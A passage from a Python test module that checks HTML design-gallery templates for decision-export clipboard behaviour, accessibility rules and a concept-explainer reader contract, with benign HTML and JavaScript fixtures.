        label = _artifact_label(artifact_id)
        if not path.is_file():
            failures.append(f"{label}: decision export contract cannot be checked because the file is missing")
            continue
        text = _document_text(path)
        elements = _elements(text)
        radio_name = str(contract["radio_name"])
        if "preserve #feature-id and #feature-name for live exports" not in text:
            failures.append(
                f"{label}: feature-header fill instruction does not preserve #feature-id and #feature-name for live exports"
            )
        radios = [
            element
            for element in elements
            if element.tag == "input"
            and _attrs(element).get("type", "").casefold() == "radio"
            and _attrs(element).get("name") == radio_name
        ]
        if not radios or any("value" not in _attrs(radio) for radio in radios):
            failures.append(f"{label}: input[name={radio_name!r}] is not a persistent valued radio group")

        required_ids = {
            "feature-id": "",
            "feature-name": "",
            "rationale-field": "textarea",
            "export-status": "",
            "fallback": "",
            "fallback-field": "textarea",
            "copy-prompt": "button",
            "copy-markdown": "button",
        }
        for identifier, expected_tag in required_ids.items():
            matches = _id_matches(elements, identifier)
            if len(matches) != 1 or (expected_tag and matches[0].tag != expected_tag):
                failures.append(f"{label}: #{identifier} does not appear exactly once with the required element type")
        if len(_id_matches(elements, "rationale-field")) == 1 and not _has_explicit_label(elements, "rationale-field"):
            failures.append(f"{label}: #rationale-field has no explicit label")
        if len(_id_matches(elements, "fallback-field")) == 1 and not _has_explicit_label(elements, "fallback-field"):
            failures.append(f"{label}: #fallback-field has no explicit label")

        statuses = _id_matches(elements, "export-status")
        if len(statuses) == 1:
            attrs = _attrs(statuses[0])
            if not (
                attrs.get("role") == "status"
                and attrs.get("aria-live") == "polite"
                and attrs.get("aria-atomic") == "true"
            ):
                failures.append(f"{label}: #export-status is not a polite atomic status region")
        fallbacks = _id_matches(elements, "fallback")
        if len(fallbacks) == 1 and "hidden" not in _attrs(fallbacks[0]):
            failures.append(f"{label}: #fallback is not initially hidden")
    return failures


def check_o2(gallery_root: Path) -> list[str]:
    """O2 — source pins exact live payload and validation behavior."""
    failures: list[str] = []
    for artifact_id, _path, text in _port_texts(gallery_root, DECISION_PORT_MANIFEST_BASELINE):
        label = _artifact_label(artifact_id)
        contract = DECISION_EXPORT_CONTRACTS[artifact_id]
        expected_literals = (
            "Artifact:",
            "Feature:",
            str(contract["prompt_lead"]),
            str(contract["markdown_lead"]),
            f'{contract["slot"]} /',
            *(str(value) for value in contract["context"]),
            "Rationale:",
            DECISION_BOTH_MISSING_MESSAGE,
            str(contract["choice_message"]),
            DECISION_RATIONALE_MISSING_MESSAGE,
        )
        missing = [literal for literal in expected_literals if literal not in text]
        if missing:
            failures.append(f"{label}: decision payload/validation literals are missing: {missing!r}")
        source_tokens = (
            f'input[name="{contract["radio_name"]}"]:checked',
            ".value.trim()",
            "aria-invalid",
            ".focus()",
            "function featureLine()",
            "textOf(FEATURE_ID_ID)",
            "textOf(FEATURE_NAME_ID)",
        )
        absent_tokens = [token for token in source_tokens if token not in text]
        if absent_tokens:
            failures.append(f"{label}: live decision validation source is missing: {absent_tokens!r}")
        if text.count("featureLine()") != 2 or "Feature: ART-004 Gallery Completion Design Prototyping" in text:
            failures.append(
                f"{label}: decision payload feature line is not derived once per export from the live feature header"
            )
        artifact_position = text.find("Artifact:")
        order = [
            artifact_position,
            text.find("featureLine()", artifact_position),
            text.find(f'{contract["slot"]} /', artifact_position),
            text.find("Rationale:", artifact_position),
        ]
        if any(position < 0 for position in order) or order != sorted(order):
            failures.append(f"{label}: common decision payload fields are not declared in contract order")
    return failures


def check_o3(gallery_root: Path) -> list[str]:
    """O3 — every refusal, invalidation, and delayed settle uses one current path."""
    failures: list[str] = []
    for artifact_id, _path, text in _port_texts(gallery_root, DECISION_PORT_MANIFEST_BASELINE):
        label = _artifact_label(artifact_id)
        required_tokens = (
            DECISION_REFUSAL_MESSAGE,
            "var invocation = 0",
            "invocation += 1",
            "token !== invocation",
            "function invalidateFallback(",
            "fallback.hidden = true",
            "fallbackField.value = ''",
            "function refuseCopy(",
            "fallback.hidden = false",
            "fallbackField.value = text",
            "fallbackField.focus()",
            "fallbackField.select()",
            "typeof clipboard.writeText",
            ".then(",
            "catch",
            ".addEventListener('input'",
            ".addEventListener('change'",
        )
        missing = [token for token in required_tokens if token not in text]
        if missing:
            failures.append(f"{label}: refusal/currentness source is missing: {missing!r}")
        if text.count(DECISION_REFUSAL_MESSAGE) != 1:
            failures.append(
                f"{label}: exact clipboard-refusal message must have one shared source, found "
                f"{text.count(DECISION_REFUSAL_MESSAGE)}"
            )
        if text.count(".writeText(") != 1:
            failures.append(f"{label}: clipboard writeText must have one call site, found {text.count('.writeText(')}")
        if text.count("refuseCopy(") != 4:
            failures.append(
                f"{label}: unavailable, synchronous, and rejected writes must share exactly three calls "
                f"to one refuseCopy definition, found {text.count('refuseCopy(')} sites"
            )
        if text.count("token !== invocation") != 2:
            failures.append(
                f"{label}: success and refusal must each suppress stale settlement, found "
                f"{text.count('token !== invocation')} current-token checks"
            )
        for token in ("fallbackField.focus()", "fallbackField.select()"):
            if text.count(token) != 1:
                failures.append(f"{label}: shared refusal path must contain {token} exactly once")
        if artifact_id == "component-variants" and ".addEventListener('click'" not in text:
            failures.append(f"{label}: reset does not invalidate stale fallback state")
    return failures


GROUP_O_CHECKS: tuple[tuple[str, Callable[[Path], list[str]]], ...] = (
    ("O1", check_o1),
    ("O2", check_o2),
    ("O3", check_o3),
)


class DecisionExportContractTests(unittest.TestCase):
    """Group O against the two decision artifacts."""

    def test_group_o_passes_against_the_gallery(self) -> None:
        self.maxDiff = None
        for name, check in GROUP_O_CHECKS:
            with self.subTest(msg=name):
                self.assertEqual(check(GALLERY_ROOT), [])


class DecisionExportContractFixtureTests(DecisionPortContractFixtureTests):
    """Focused non-vacuity fixtures for Group O."""

    def export_body(self, artifact_id: str, *, source: str | None = None) -> str:
        contract = DECISION_EXPORT_CONTRACTS[artifact_id]
        context = "\n".join(str(value) for value in contract["context"])
        script = source or (
            "var FEATURE_ID_ID = 'feature-id'; var FEATURE_NAME_ID = 'feature-name';\n"
            "var invocation = 0;\n"
            "var rationale = document.getElementById('rationale-field');\n"
            "var fallback = document.getElementById('fallback');\n"
            "var fallbackField = document.getElementById('fallback-field');\n"
            "function invalidateFallback() { fallback.hidden = true; fallbackField.value = ''; }\n"
            "function textOf(identifier) { var element = document.getElementById(identifier); return element ? element.textContent.replace(/\\s+/g, ' ').trim() : ''; }\n"
            "function featureLine() { var identifier = textOf(FEATURE_ID_ID); var name = textOf(FEATURE_NAME_ID); if (!identifier && !name) return 'Feature: not named in this document'; return 'Feature: ' + (identifier ? identifier + ' ' + name : name).trim(); }\n"
            f"var chosen = document.querySelector('input[name=\"{contract['radio_name']}\"]:checked');\n"
            "var rationaleValue = rationale.value.trim(); rationale.setAttribute('aria-invalid', 'true'); rationale.focus();\n"
            f"var lines = ['Artifact: title', featureLine(), '', 'lead', '', '{contract['slot']} / label  (#anchor)',\n"
            f"'{context}', 'Rationale: ' + rationaleValue];\n"
            f"var promptLead = {str(contract['prompt_lead'])!r};\n"
            f"var markdownLead = {str(contract['markdown_lead'])!r};\n"
            f"var bothMissing = {DECISION_BOTH_MISSING_MESSAGE!r};\n"
            f"var choiceMissing = {str(contract['choice_message'])!r};\n"
            f"var rationaleMissing = {DECISION_RATIONALE_MISSING_MESSAGE!r};\n"
            f"var refusal = {DECISION_REFUSAL_MESSAGE!r};\n"
            "function refuseCopy(text, token) { if (token !== invocation) return; fallback.hidden = false; fallbackField.value = text; fallbackField.focus(); fallbackField.select(); }\n"
            "function copy(text) { invocation += 1; var token = invocation; invalidateFallback(); var clipboard = window.navigator.clipboard; if (!clipboard || typeof clipboard.writeText !== 'function') { refuseCopy(text, token); return; } try { clipboard.writeText(text).then(function () { if (token !== invocation) return; }, function () { refuseCopy(text, token); }); } catch (error) { refuseCopy(text, token); } }\n"
            "rationale.addEventListener('input', invalidateFallback);\n"
            "document.addEventListener('change', invalidateFallback);\n"
            "document.addEventListener('click', invalidateFallback);\n"
        )
        return (
            '<!-- Slot: feature-header | Fills: feature identity; preserve #feature-id and #feature-name for live exports | Source: spec.md -->'
            '<p id="feature-id">ID</p><h1 id="feature-name">Name</h1>'
            f'<fieldset><legend>Decision</legend><label><input type="radio" name="{contract["radio_name"]}" value="anchor">Option</label></fieldset>'
            '<label for="rationale-field">Rationale</label><textarea id="rationale-field"></textarea>'
            '<button id="copy-prompt" type="button">Copy as prompt</button>'
            '<button id="copy-markdown" type="button">Copy as Markdown</button>'
            '<p id="export-status" role="status" aria-live="polite" aria-atomic="true"></p>'
            '<div id="fallback" hidden><label for="fallback-field">Manual copy</label>'
            '<textarea id="fallback-field"></textarea></div>'
            f"<script>{script}</script>"
        )

    def write_export_gallery(self) -> None:
        self.write_canonical_files()
        self.write(MANIFEST_FILE, json.dumps(self.manifest(), indent=2))
        for artifact_id in DECISION_EXPORT_CONTRACTS:
            self.write_decision_artifact(artifact_id, body=self.export_body(artifact_id))

    def test_accepts_complete_decision_export_contract(self) -> None:
        self.write_export_gallery()
        self.assertEqual([failure for _, check in GROUP_O_CHECKS for failure in check(self.gallery)], [])

    def test_rejects_non_atomic_export_status(self) -> None:
        self.write_export_gallery()
        body = self.export_body("visual-designs").replace(' aria-atomic="true"', "")
        self.write_decision_artifact("visual-designs", body=body)
        self.assertReports(check_o1(self.gallery), "visual-designs.html", "atomic")

    def test_rejects_a_fill_instruction_that_drops_live_feature_selectors(self) -> None:
        self.write_export_gallery()
        body = self.export_body("visual-designs").replace(
            "; preserve #feature-id and #feature-name for live exports",
            "",
        )
        self.write_decision_artifact("visual-designs", body=body)
        self.assertReports(check_o1(self.gallery), "visual-designs.html", "fill instruction", "#feature-id")

    def test_rejects_a_replacement_feature_header_without_live_ids(self) -> None:
        self.write_export_gallery()
        body = self.export_body("component-variants").replace(' id="feature-id"', "", 1)
        self.write_decision_artifact("component-variants", body=body)
        self.assertReports(check_o1(self.gallery), "component-variants.html", "#feature-id", "exactly once")

    def test_rejects_missing_exact_validation_message(self) -> None:
        self.write_export_gallery()
        body = self.export_body("component-variants").replace(DECISION_BOTH_MISSING_MESSAGE, "Choose inputs.")
        self.write_decision_artifact("component-variants", body=body)
        self.assertReports(check_o2(self.gallery), "component-variants.html", "payload/validation")

    def test_rejects_a_feature_line_hard_coded_to_the_template_sample(self) -> None:
        self.write_export_gallery()
        body = self.export_body("visual-designs").replace(
            "featureLine(),",
            "'Feature: ART-004 Gallery Completion Design Prototyping',",
            1,
        )
        self.write_decision_artifact("visual-designs", body=body)
        self.assertReports(check_o2(self.gallery), "visual-designs.html", "live feature header")

    def test_rejects_multiple_clipboard_write_sites(self) -> None:
        self.write_export_gallery()
        body = self.export_body("visual-designs").replace("</script>", "navigator.clipboard.writeText('retry');</script>")
        self.write_decision_artifact("visual-designs", body=body)
        self.assertReports(check_o3(self.gallery), "visual-designs.html", "one call site", "found 2")

    def test_rejects_a_success_path_without_stale_settle_suppression(self) -> None:
        self.write_export_gallery()
        body = self.export_body("component-variants").replace(
            "then(function () { if (token !== invocation) return; },",
            "then(function () { return; },",
        )
        self.write_decision_artifact("component-variants", body=body)
        self.assertReports(check_o3(self.gallery), "component-variants.html", "success and refusal", "1 current-token")

    def accessibility_body(self, artifact_id: str) -> str:
        choice_count = DECISION_ACCESSIBILITY_CONTRACTS[artifact_id]["choice_count"]
        if not isinstance(choice_count, int):
            raise AssertionError("fixture choice count must be an integer")
        radio_name = str(DECISION_EXPORT_CONTRACTS[artifact_id]["radio_name"])
        body = self.export_body(artifact_id)
        extra_choices = "".join(
            f'<label><input type="radio" name="{radio_name}" value="choice-{index}">Choice {index}</label>'
            for index in range(2, choice_count + 1)
        )
        body = body.replace("</fieldset>", extra_choices + "</fieldset>", 1)

        if artifact_id == "visual-designs":
            controls = (
                '<fieldset id="bg-seg"><legend>Background</legend>'
                '<label><input type="radio" name="bg" value="light" checked>Light</label>'
                '<label><input type="radio" name="bg" value="dark">Dark</label></fieldset>'
                '<span class="stage-copy"><strong>Title</strong><span>Description</span>'
                '<span class="float-stack"></span></span>'
            )
        else:
            states = "".join(
                f'<article data-state="{state}">{state}</article>'
                for state in COMPONENT_VARIANT_STATE_VALUES
            )
            controls = (
                '<label for="ctl-pad">Padding</label>'
                '<input id="ctl-pad" type="range" min="12" max="32" step="2" value="20">'
                '<output id="pad-out" for="ctl-pad">20px</output>'
                '<fieldset><legend>Border</legend>'
                '<label><input type="radio" name="border" value="none">None</label>'
                '<label><input type="radio" name="border" value="hairline" checked>Hairline</label>'
                '<label><input type="radio" name="border" value="solid">Solid</label></fieldset>'
                '<label><input id="ctl-shadow" type="checkbox" checked>Show shadow</label>'
                '<button id="reset-controls" type="button">Reset controls</button>'
                '<button type="button" disabled>Disabled state</button>'
                '<span aria-busy="true">Loading state</span>'
                f"{states}"
            )

        visual_layout_styles = (
            ".stage-copy { display: block; }\n"
            ".stage-copy > strong { display: block; }\n"
            ".stage-copy > strong + span { display: block; }\n"
            ".float-stack { display: block; }\n"
            if artifact_id == "visual-designs"
            else ""
        )
        styles = (
            "<style>\n"
            ".decision-motion { color: var(--rc-text); transition: border-color 120ms ease; }\n"
            f"{visual_layout_styles}"
            "input:checked { outline: 2px solid var(--rc-focus); }\n"
            "input:focus-visible, button:focus-visible, textarea:focus-visible { "
            "outline: 2px solid var(--rc-focus); }\n"
            "@media (prefers-reduced-motion: reduce) {\n"
            "  .decision-motion { animation: none !important; transition: none !important; }\n"
            "}\n"
            "</style>"
        )
        return styles + controls + body

    def write_accessibility_gallery(self) -> None:
        self.write_canonical_files()
        self.write(MANIFEST_FILE, json.dumps(self.manifest(), indent=2))
        for artifact_id in DECISION_ACCESSIBILITY_CONTRACTS:
            self.write_decision_artifact(artifact_id, body=self.accessibility_body(artifact_id))

    def test_group_p_accepts_accessible_decision_controls(self) -> None:
        self.write_accessibility_gallery()
        self.assertEqual([failure for _, check in GROUP_P_CHECKS for failure in check(self.gallery)], [])

    def test_group_p_rejects_an_unlabelled_live_control(self) -> None:
        self.write_accessibility_gallery()
        body = self.accessibility_body("component-variants").replace(
            '<label for="ctl-pad">Padding</label>', "<span>Padding</span>"
        )
        self.write_decision_artifact("component-variants", body=body)
        self.assertReports(check_p1(self.gallery), "component-variants.html", "#ctl-pad", "label")

    def test_group_p_rejects_positive_tabindex_before_manifest_shipping(self) -> None:
        self.write_accessibility_gallery()
        body = self.accessibility_body("visual-designs").replace(
            '<textarea id="rationale-field">', '<textarea id="rationale-field" tabindex="3">'
        )
        self.write_decision_artifact("visual-designs", body=body)
        self.assertReports(check_p2(self.gallery), "visual-designs.html", "positive tabindex", "3")

    def test_group_p_rejects_missing_local_reduced_motion_override(self) -> None:
        self.write_accessibility_gallery()
        body = self.accessibility_body("visual-designs").replace(
            "@media (prefers-reduced-motion: reduce)", "@media (min-width: 1px)"
        )
        self.write_decision_artifact("visual-designs", body=body)
        self.assertReports(check_p3(self.gallery), "visual-designs.html", "reduced-motion")

    def test_group_p_rejects_a_missing_mobile_viewport_contract(self) -> None:
        self.write_accessibility_gallery()
        relative = f"{TEMPLATES_DIR}/component-variants.html"
        text = _document_text(self.gallery / relative).replace(
            '<meta name="viewport" content="width=device-width, initial-scale=1">',
            "",
            1,
        )
        self.write(relative, text)
        self.assertReports(check_p3(self.gallery), "component-variants.html", "viewport")

    def test_group_p_rejects_an_inline_playful_preview_wrapper(self) -> None:
        self.write_accessibility_gallery()
        relative = f"{TEMPLATES_DIR}/visual-designs.html"
        text = _document_text(self.gallery / relative).replace(
            ".float-stack { display: block; }",
            ".float-stack { color: inherit; }",
            1,
        )
        self.write(relative, text)
        self.assertReports(check_p3(self.gallery), "visual-designs.html", ".float-stack", "display:block")

    def test_group_p_rejects_unaudited_authored_color_literal(self) -> None:
        self.write_accessibility_gallery()
        body = self.accessibility_body("component-variants").replace(
            "color: var(--rc-text)", "color: #777777", 1
        )
        self.write_decision_artifact("component-variants", body=body)
        self.assertReports(check_p3(self.gallery), "component-variants.html", "unaudited color")


# ---------------------------------------------------------------------------
# Group P — decision-port accessibility contract
# ---------------------------------------------------------------------------

COMPONENT_VARIANT_STATE_VALUES: tuple[str, ...] = (
    "default",
    "hover",
    "focus",
    "disabled",
    "error",
    "loading",
)
DECISION_ACCESSIBILITY_CONTRACTS: dict[str, dict[str, object]] = {
    "visual-designs": {
        "choice_count": 4,
        "radio_counts": {"bg": 2, "chosen-direction": 4},
        "defaulted_radios": ("bg",),
    },
    "component-variants": {
        "choice_count": 6,
        "radio_counts": {"border": 3, "chosen-base-variant": 6},
        "defaulted_radios": ("border",),
    },
}
_STYLE_BLOCK_RE = re.compile(r"(?is)<style\b[^>]*>(.*?)</style>")
_HIDDEN_INPUT_RULE_RE = re.compile(r"(?is)\binput\b[^{}]*\{[^{}]*\bdisplay\s*:\s*none\b")
_UNAUDITED_COLOR_RE = re.compile(
    r"(?i)(?:^|[;{])\s*(?:color|background(?:-color)?|border(?:-(?:top|right|bottom|left))?-color|"
    r"outline-color|fill|stroke)\s*:\s*(?:#[0-9a-f]{3,8}\b|rgba?\(|hsla?\()"
)


def _control_is_labelled(element: _Element, elements: list[_Element]) -> bool:
    attrs = _attrs(element)
    if attrs.get("aria-label", "").strip():
        return True
    labelledby = attrs.get("aria-labelledby", "").split()
    if labelledby and all(identifier in _element_ids(elements) for identifier in labelledby):
        return True
    if element.parent == "label":
        return True
    return bool(attrs.get("id") and _has_explicit_label(elements, attrs["id"]))


def _decision_authored_styles(text: str) -> str:
    scrubbed = text
    if _embeds(text, BRAND_BLOCK):
        scrubbed = scrubbed.replace(_region(text, BRAND_BLOCK), "", 1)
    return "\n".join(_STYLE_BLOCK_RE.findall(scrubbed))


def check_p1(gallery_root: Path) -> list[str]:
    """P1 — decision values use labelled native controls and stable state."""
    failures: list[str] = []
    for artifact_id, contract in DECISION_ACCESSIBILITY_CONTRACTS.items():
        path = _port_path(gallery_root, artifact_id)
        label = _artifact_label(artifact_id)
        if not path.is_file():
            failures.append(f"{label}: decision accessibility cannot be checked because the file is missing")
            continue
        elements = _elements(_document_text(path))
        if sum(element.tag == "fieldset" for element in elements) < 2 or sum(
            element.tag == "legend" for element in elements
        ) < 2:
            failures.append(f"{label}: radio choices do not expose two native named groups")

        radio_counts = contract["radio_counts"]
        if not isinstance(radio_counts, dict):
            raise AssertionError("decision radio contract must be a mapping")
        for name, expected_count in radio_counts.items():
            radios = [
                element
                for element in elements
                if element.tag == "input"
                and _attrs(element).get("type", "").casefold() == "radio"
                and _attrs(element).get("name") == name
            ]
            if len(radios) != expected_count:
                failures.append(
                    f"{label}: input[name={name!r}] has {len(radios)} choices rather than {expected_count}"
                )
                continue
            if any(not _attrs(radio).get("value", "").strip() for radio in radios):
                failures.append(f"{label}: input[name={name!r}] has a choice without a value")
            if any(not _control_is_labelled(radio, elements) for radio in radios):
                failures.append(f"{label}: input[name={name!r}] has a choice without a visible or programmatic label")
            checked = sum("checked" in _attrs(radio) for radio in radios)
            expected_checked = 1 if name in contract["defaulted_radios"] else 0
            if checked != expected_checked:
                failures.append(
                    f"{label}: input[name={name!r}] has {checked} authored checked choices rather than "
                    f"{expected_checked}"
                )

        if artifact_id == "visual-designs":
            background_groups = _id_matches(elements, "bg-seg")
            if len(background_groups) != 1 or background_groups[0].tag != "fieldset":
                failures.append(f"{label}: #bg-seg is not exactly one native fieldset")
        else:
            required_inputs = {"ctl-pad": "range", "ctl-shadow": "checkbox"}
            for identifier, input_type in required_inputs.items():
                matches = _id_matches(elements, identifier)
                if (
                    len(matches) != 1
                    or matches[0].tag != "input"
                    or _attrs(matches[0]).get("type", "").casefold() != input_type
                ):
                    failures.append(f"{label}: #{identifier} is not exactly one native {input_type} input")
                elif not _control_is_labelled(matches[0], elements):
                    failures.append(f"{label}: #{identifier} has no visible or programmatic label")

            pads = _id_matches(elements, "ctl-pad")
            if len(pads) == 1 and any(
                _attrs(pads[0]).get(name) != value
                for name, value in {"min": "12", "max": "32", "step": "2", "value": "20"}.items()
            ):
                failures.append(f"{label}: #ctl-pad does not expose its authored min/max/step/value")
            outputs = _id_matches(elements, "pad-out")
            if len(outputs) != 1 or outputs[0].tag != "output" or _attrs(outputs[0]).get("for") != "ctl-pad":
                failures.append(f"{label}: #pad-out is not an output associated with #ctl-pad")
            resets = _id_matches(elements, "reset-controls")
            if len(resets) != 1 or resets[0].tag != "button":
                failures.append(f"{label}: #reset-controls is not exactly one native button")
    return failures


def check_p2(gallery_root: Path) -> list[str]:
    """P2 — planned decision files preserve native keyboard focus order."""
    failures: list[str] = []
    for artifact_id, _path, text in _port_texts(gallery_root, DECISION_PORT_MANIFEST_BASELINE):
        label = _artifact_label(artifact_id)
        elements = _elements(text)
        for element in elements:
            for value in _attribute_values(element, "tabindex"):
                try:
                    positive = int(value.strip()) > 0
                except ValueError:
                    positive = False
                if positive:
                    failures.append(f"{label}: positive tabindex {value!r} replaces logical source order")
        if _HIDDEN_INPUT_RULE_RE.search(text):
            failures.append(f"{label}: CSS display:none removes native inputs from keyboard operation")
        if re.search(r"(?i)\boutline\s*:\s*none\b", text):
            failures.append(f"{label}: outline:none suppresses visible keyboard focus")
        if ":focus-visible" not in text:
            failures.append(f"{label}: no focus-visible treatment is present")
        custom_roles = [
            element
            for element in elements
            if element.tag not in _CONTROL_TAGS
            and any(value.casefold() in _CONTROL_ROLES for value in _attribute_values(element, "role"))
        ]
        if custom_roles:
            failures.append(f"{label}: action controls use custom roles instead of native controls")
    return failures


def check_p3(gallery_root: Path) -> list[str]:
    """P3 — theme, non-color state, and reduced-motion contracts stay explicit."""
    failures: list[str] = []
    for artifact_id, _path, text in _port_texts(gallery_root, DECISION_PORT_MANIFEST_BASELINE):
        label = _artifact_label(artifact_id)
        elements = _elements(text)
        styles = _decision_authored_styles(text)
        viewports = [
            element
            for element in elements
            if element.tag == "meta" and _attrs(element).get("name", "").casefold() == "viewport"
        ]
        if len(viewports) != 1 or _attrs(viewports[0]).get("content") != "width=device-width, initial-scale=1":
            failures.append(f"{label}: mobile viewport metadata is missing or non-canonical")
        if _UNAUDITED_COLOR_RE.search(styles):
            failures.append(f"{label}: port-authored CSS introduces an unaudited color literal")
        if not _REDUCED_MOTION_RE.search(styles) or not re.search(
            r"(?i)\banimation\s*:\s*none\b", styles
        ) or not re.search(r"(?i)\btransition\s*:\s*none\b", styles):
            failures.append(f"{label}: local reduced-motion override does not remove animation and transition")
        if re.search(r"(?i)\bscroll-behavior\s*:\s*smooth\b", styles):
            failures.append(f"{label}: authored smooth scrolling is not reduced-motion safe")

        if artifact_id == "visual-designs":
            required_layout_rules = {
                ".stage-copy": r"(?is)\.stage-copy\s*\{[^}]*\bdisplay\s*:\s*block\b",
                ".stage-copy > strong": r"(?is)\.stage-copy\s*>\s*strong\s*\{[^}]*\bdisplay\s*:\s*block\b",
                ".stage-copy > strong + span": r"(?is)\.stage-copy\s*>\s*strong\s*\+\s*span\s*\{[^}]*\bdisplay\s*:\s*block\b",
                ".float-stack": r"(?is)\.float-stack\s*\{[^}]*\bdisplay\s*:\s*block\b",
            }
            missing_layout_rules = [
                selector for selector, pattern in required_layout_rules.items() if re.search(pattern, styles) is None
            ]
            if missing_layout_rules:
                failures.append(
                    f"{label}: inline preview wrappers lack display:block layout for {missing_layout_rules!r}"
                )
            if re.search(r"(?i)\.stage-copy\s+(?:h3|p)\b", styles):
                failures.append(f"{label}: preview styles target absent h3/p children instead of shipped inline markup")

        if artifact_id == "component-variants":
            states = tuple(
                values[0]
                for element in elements
                if len(values := _attribute_values(element, "data-state")) == 1
            )
            if states != COMPONENT_VARIANT_STATE_VALUES:
                failures.append(
                    f"{label}: visible non-color state markers are {states!r} rather than "
                    f"{COMPONENT_VARIANT_STATE_VALUES!r}"
                )
            if not any("disabled" in _attrs(element) for element in elements):
                failures.append(f"{label}: disabled state has no native disabled marker")
            if not any(_attrs(element).get("aria-busy") == "true" for element in elements):
                failures.append(f"{label}: loading state has no aria-busy marker")
    return failures


GROUP_P_CHECKS: tuple[tuple[str, Callable[[Path], list[str]]], ...] = (
    ("P1", check_p1),
    ("P2", check_p2),
    ("P3", check_p3),
)


class DecisionAccessibilityContractTests(unittest.TestCase):
    """Group P against the two decision artifacts."""

    def test_group_p_passes_against_the_gallery(self) -> None:
        self.maxDiff = None
        for name, check in GROUP_P_CHECKS:
            with self.subTest(msg=name):
                self.assertEqual(check(GALLERY_ROOT), [])


# ---------------------------------------------------------------------------
# Group R - ART-005 concept-explainer reader contract (FR-003, FR-005,
# FR-006, FR-012-FR-014, FR-021-FR-022)
# ---------------------------------------------------------------------------

CONCEPT_EXPLAINER_ID = "concept-explainer"
CONCEPT_EXPLAINER_SOURCE_FILE = "15-research-concept-explainer.html"
CONCEPT_EXPLAINER_LABEL = f"{TEMPLATES_DIR}/{CONCEPT_EXPLAINER_ID}.html"


def check_r1(gallery_root: Path) -> list[str]:
    """R1 - the concept reader and bounded transient simulation agree."""
    matches = [
        entry for entry in (_entries(gallery_root) or [])
        if isinstance(entry, dict) and entry.get("id") == CONCEPT_EXPLAINER_ID
    ]
    if len(matches) != 1:
        return [f"{MANIFEST_FILE}: expected one '{CONCEPT_EXPLAINER_ID}' entry, found {len(matches)}"]
    entry = matches[0]
    source = entry.get("source")
    failures: list[str] = []
    if entry.get("status") != SHIPPED:
        failures.append(f"{MANIFEST_FILE}: '{CONCEPT_EXPLAINER_ID}' must be shipped, found {entry.get('status')!r}")
    if entry.get("exports") != []:
        failures.append(f"{MANIFEST_FILE}: '{CONCEPT_EXPLAINER_ID}' is a reader and must keep exports: []")
    if not isinstance(source, dict) or source.get("origin") != UPSTREAM or source.get("file") != CONCEPT_EXPLAINER_SOURCE_FILE:
        failures.append(f"{MANIFEST_FILE}: '{CONCEPT_EXPLAINER_ID}' must remain sourced from {CONCEPT_EXPLAINER_SOURCE_FILE}")
    artifact = _artifact_path(gallery_root, CONCEPT_EXPLAINER_ID)
    if artifact is None or not artifact.is_file():
        failures.append(f"{CONCEPT_EXPLAINER_LABEL}: missing reader artifact")
        return failures

    text = _document_text(artifact)
    lowered = text.casefold()
    elements = _elements(text)
    attributes = [dict(element.attributes) for element in elements]
    authored = text
    for block in CANONICAL_FILES:
        if not _embeds(text, block):
            failures.append(f"{CONCEPT_EXPLAINER_LABEL}: missing canonical {block} block")
        elif (expected := _canonical_region(gallery_root, block)) is None or _region(text, block) != expected:
            failures.append(f"{CONCEPT_EXPLAINER_LABEL}: canonical {block} bytes drifted")
        else:
            authored = authored.replace(_region(text, block), "")
    header = _attribution_header(text)
    if header is None or any(not _carried(header, element) for element in ATTRIBUTION_ELEMENTS):
        failures.append(f"{CONCEPT_EXPLAINER_LABEL}: incomplete upstream attribution header")
    elif _labelled_value(header, UPSTREAM_FILE_LABEL) != CONCEPT_EXPLAINER_SOURCE_FILE:
        failures.append(f"{CONCEPT_EXPLAINER_LABEL}: attribution must name {CONCEPT_EXPLAINER_SOURCE_FILE}")

    for token in ("copy as", "navigator.clipboard", "execcommand(", "download="):
        if token in lowered:
            failures.append(f"{CONCEPT_EXPLAINER_LABEL}: reader exposes export token {token!r}")
    for token in ("localstorage", "sessionstorage", "indexeddb", "math.random", "date.now"):
        if token in authored.casefold():
            failures.append(f"{CONCEPT_EXPLAINER_LABEL}: simulation must be transient and deterministic, found {token!r}")

    by_id = {attrs.get("id"): attrs for attrs in attributes if attrs.get("id")}
    for control, kind in (("node-count", "range"), ("key-count", "range")):
        attrs = by_id.get(control, {})
        if attrs.get("type") != kind or not attrs.get("min") or not attrs.get("max"):
            failures.append(f"{CONCEPT_EXPLAINER_LABEL}: '{control}' must expose explicit range bounds")
        if f'for="{control}"' not in text and f"for='{control}'" not in text:
            failures.append(f"{CONCEPT_EXPLAINER_LABEL}: '{control}' has no explicit label")
    for control in ("remove-node", "add-node", "reset-simulation"):
        if by_id.get(control, {}).get("aria-label", "").strip() == "":
            failures.append(f"{CONCEPT_EXPLAINER_LABEL}: '{control}' must be a named control")
    required = (
        'id="node-count-value"', 'id="key-count-value"', 'id="simulation-status"',
        'role="status"', 'aria-live="polite"', "Minimum 2 nodes", "Maximum 8 nodes",
        "Minimum 10 keys", "Maximum 60 keys", ".disabled", "resetSimulation",
    )
    failures.extend(f"{CONCEPT_EXPLAINER_LABEL}: missing bounded-state hook {token!r}" for token in required if token not in text)
    if ":focus-visible" not in text or "prefers-reduced-motion" not in text:
        failures.append(f"{CONCEPT_EXPLAINER_LABEL}: visible-focus or reduced-motion handling is missing")
    widths = [int(value) for value in re.findall(r"@media[^{}]*max-width\s*:\s*(\d+)px", text, re.IGNORECASE)]
    if not any(width >= 360 for width in widths):
        failures.append(f"{CONCEPT_EXPLAINER_LABEL}: no responsive rule covers 360 CSS px")
    for element, attrs in zip(elements, attributes):
        value = attrs.get("tabindex", "")
        if value.lstrip("-").isdigit() and int(value) > 0:
            failures.append(f"{CONCEPT_EXPLAINER_LABEL}: <{element.tag}> uses positive tabindex={value!r}")
    for selector, declarations in _RULE_RE.findall(text):
        if _HORIZONTAL_OVERFLOW_RE.search(declarations):
            classes = re.findall(r"\.([A-Za-z_-][\w-]*)", selector)
            matched = [attrs for attrs in attributes if any(name in attrs.get("class", "").split() for name in classes)]
            if not matched or any(attrs.get("tabindex") != "0" or attrs.get("role") != "group" or not (attrs.get("aria-label", "").strip() or attrs.get("aria-labelledby", "").strip()) for attrs in matched):
                failures.append(f"{CONCEPT_EXPLAINER_LABEL}: actual horizontal scroll element must be named, grouped, and keyboard reachable")
    return failures


class ConceptExplainerReaderTests(unittest.TestCase):
    def test_concept_explainer_contract_passes_against_the_shipped_gallery(self) -> None:
        self.assertEqual(check_r1(GALLERY_ROOT), [])


# ---------------------------------------------------------------------------
# Group S - ART-005 status-report reader contract (FR-003, FR-005, FR-006,
# FR-013, FR-014, FR-020, FR-022)
